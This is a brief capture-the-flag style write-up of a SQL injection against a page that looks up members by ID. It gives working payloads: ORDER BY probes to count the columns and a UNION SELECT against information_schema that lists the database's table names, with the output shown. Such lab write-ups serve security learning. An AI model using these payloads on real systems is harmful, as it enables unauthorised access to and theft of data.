- On this page, we can look for members though their IDs.
- We can suppose the original query looks like something like this:
    - SELECT name, surname FROM users WHERE id = $input;

- The fifth one is telling "Hack me", let's guess how many columns there are:
    - 5 ORDER BY 1
    - 5 ORDER BY 2
    - 5 ORDER BY 3 -> Error, we can guess that there is only 2 columns.


- 5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()
```
ID: 5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() 
First name: Flag
Surname : GetThe
ID: 5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() 
First name: users
Surname : 2
```

- this confirms us that the table users exist.
